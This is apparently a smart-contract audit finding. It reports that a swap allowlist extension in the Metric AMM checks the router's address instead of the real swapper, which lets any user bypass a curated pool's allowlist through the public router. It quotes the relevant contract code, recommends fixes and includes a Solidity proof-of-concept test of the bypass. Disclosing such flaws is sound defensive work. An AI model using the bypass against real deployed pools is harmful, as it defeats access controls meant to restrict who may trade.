### Title
SwapAllowlistExtension Gates the Router Address Instead of the Real Swapper, Allowing Any User to Bypass a Curated Pool's Swap Allowlist — (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

---

### Summary

`SwapAllowlistExtension.beforeSwap` checks the `sender` argument passed by the pool, which equals `msg.sender` of the pool's `swap` call. When a user swaps through `MetricOmmSimpleRouter`, the pool's `msg.sender` is the router contract, not the actual end user. If the pool admin allowlists the router (the only way to permit router-mediated swaps on a curated pool), every non-allowlisted user can bypass the allowlist by routing through the public router.

---

### Finding Description

`MetricOmmPool.swap` passes `msg.sender` as the `sender` argument to `_beforeSwap`: [1](#0-0) 

`ExtensionCalling._beforeSwap` forwards that value unchanged to every configured extension: [2](#0-1) 

`SwapAllowlistExtension.beforeSwap` then checks `allowedSwapper[msg.sender][sender]`, where `msg.sender` is the pool and `sender` is the value received from the pool — i.e., whoever called `pool.swap()`: [3](#0-2) 

`MetricOmmSimpleRouter.exactInputSingle` calls `pool.swap()` directly, making the router the pool's `msg.sender`: [4](#0-3) 

The same pattern holds for `exactInput`, `exactOutputSingle`, and `exactOutput`. [5](#0-4) 

**Consequence:** The allowlist lookup is keyed on the router's address, not the real user's address. A pool admin who wants allowlisted users to be able to use the router must call `setAllowedToSwap(pool, router, true)`. Once the router is allowlisted, the check `allowedSwapper[pool][router]` passes for every caller of the router, regardless of whether that caller is on the allowlist.

---

### Impact Explanation

A curated pool's swap allowlist is completely defeated. Any non-allowlisted address — including addresses the pool admin explicitly excluded — can execute swaps on the pool by calling `MetricOmmSimpleRouter.exactInputSingle` (or any other router entry point). The pool receives and settles real token transfers, so the attacker obtains real output tokens. This is a direct loss of the curation guarantee and, depending on the pool's purpose (e.g., KYC-gated, institutional-only, or regulatory-restricted), constitutes a High-severity policy bypass with fund-impacting consequences.

---

### Likelihood Explanation

The `MetricOmmSimpleRouter` is the primary user-facing swap interface documented and deployed by the protocol. Any pool admin who configures a swap allowlist and also wants allowlisted users to access the router must allowlist the router address — the only supported path. This is the expected operational configuration, making the bypass reachable by any unprivileged user with no special setup.

---

### Recommendation

The extension must receive and check the **original end-user address**, not the intermediary contract's address. Two complementary fixes:

1. **Router-side:** Have the router forward the real user's address in `extensionData` and have the extension decode it, verifying that `msg.sender` of the pool call is a trusted router before accepting the forwarded identity.
2. **Extension-side (preferred):** Change `SwapAllowlistExtension.beforeSwap` to check `sender` only when `sender` is not a known trusted router; when `sender` is a trusted router, require the real user identity to be supplied and verified via `extensionData`.

A simpler but more restrictive fix is to document that router-mediated swaps are incompatible with `SwapAllowlistExtension` and revert in `beforeSwap` whenever `sender` is a known router address.

---

### Proof of Concept

```solidity
// Pool admin sets up a curated pool: only `allowedUser` may swap.
// Admin also allowlists the router so allowedUser can use it.
swapExtension.setAllowedToSwap(address(pool), allowedUser, true);
swapExtension.setAllowedToSwap(address(pool), address(router), true); // required for router path

// Attacker (not on allowlist) bypasses the guard via the router:
vm.startPrank(attacker); // attacker != allowedUser, not in allowlist
token0.approve(address(router), type(uint256).max);

IMetricOmmSimpleRouter.ExactInputSingleParams memory params = IMetricOmmSimpleRouter.ExactInputSingleParams({
    pool: address(pool),
    tokenIn: address(token0),
    recipient: attacker,
    deadline: block.timestamp + 1,
    zeroForOne: true,
    amountIn: 1_000e18,
    amountOutMinimum: 0,
    priceLimitX64: 0,
    extensionData: ""
});

// Succeeds: pool sees sender = router (allowlisted), never checks attacker's address.
uint256 amountOut = router.exactInputSingle(params);
assertGt(amountOut, 0); // attacker received real tokens from a pool they are not allowed to access
vm.stopPrank();
```

The `beforeSwap` hook receives `sender = address(router)`, finds it in `allowedSwapper[pool][router]`, and returns success. The attacker's address is never consulted. [3](#0-2) [6](#0-5) [7](#0-6)

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L224-241)
```text
  ) external whenNotPaused nonReentrant(PoolActions.SWAP) returns (int128, int128) {
    require(amountSpecified != 0, InvalidAmount());

    uint256 packedSlot0Initial = Slot0Library.loadPackedSlot0();
    (uint128 bidPriceX64, uint128 askPriceX64) = _getBidAndAskPriceX64();

    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );

```

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L99-125)
```text
    for (uint256 i = 0; i <= last; i++) {
      address pool = params.pools[i];
      bool zeroForOne = MetricOmmSwapPath.resolveZeroForOneBitmap(params.zeroForOneBitMap, i);

      _setNextCallbackContext(pool, CALLBACK_MODE_JUST_PAY, i == 0 ? msg.sender : address(this), params.tokens[i]);
      (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(pool)
        .swap(
          i == last ? params.recipient : address(this),
          zeroForOne,
          amount,
          MetricOmmSwapPath.openLimit(zeroForOne),
          "",
          params.extensionDatas[i]
        );

      int128 amountInActual = MetricOmmSwapResults.extractAmountIn(zeroForOne, amount0Delta, amount1Delta);
      if (amountInActual < amount) revert InvalidInputAmountAtHop(uint8(i), amountInActual, amount);

      amount = MetricOmmSwapResults.extractAmountOut(zeroForOne, amount0Delta, amount1Delta);
    }

    if (amount <= 0) revert InvalidSwapDeltas();
    amountOut = MetricOmmSwapInputs.int128ToUint128(amount);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
